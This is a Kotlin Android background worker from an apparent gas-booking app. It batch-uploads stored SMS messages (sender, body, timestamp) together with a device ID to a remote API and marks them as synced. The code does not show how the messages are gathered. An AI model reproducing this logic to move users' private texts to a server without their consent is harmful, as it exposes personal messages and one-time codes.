package com.gasbooking.app.worker

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.gasbooking.app.network.RetrofitClient
import com.gasbooking.app.network.SMSBatchRequest
import com.gasbooking.app.network.SMSRequest
import com.gasbooking.app.utils.DatabaseHelper
import com.gasbooking.app.utils.DeviceUtils
import java.lang.Exception

class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val dbHelper = DatabaseHelper(applicationContext)
        val unsyncedList = dbHelper.getUnsyncedMessages()

        if (unsyncedList.isEmpty()) return Result.success()

        val deviceId = DeviceUtils.getDeviceId(applicationContext)
        val appVersion = "2.1.0" // Current Production Version

        // 1. Prepare Batch Request
        val smsData = unsyncedList.map { 
            SMSRequest(it.sender, it.body, it.timestamp.toString()) 
        }
        val request = SMSBatchRequest(deviceId, appVersion, smsData)

        try {
            // 2. Sync Entire Batch via API
            val response = RetrofitClient.smsApi.saveSMSBatch(request)

            if (response.isSuccessful) {
                // 3. Update sync status for all messages in batch
                for (sms in unsyncedList) {
                    dbHelper.updateSyncStatus(sms.id!!, 1) // 1 = synced
                }
                println("BATCH SYNC SUCCESS: ${unsyncedList.size} messages uploaded")
                return Result.success()
            } else {
                println("BATCH SYNC FAILED: API Error ${response.code()}")
                return Result.retry() 
            }
        } catch (e: Exception) {
            println("BATCH SYNC EXCEPTION: ${e.message}")
            return Result.retry()
        }
    }
}
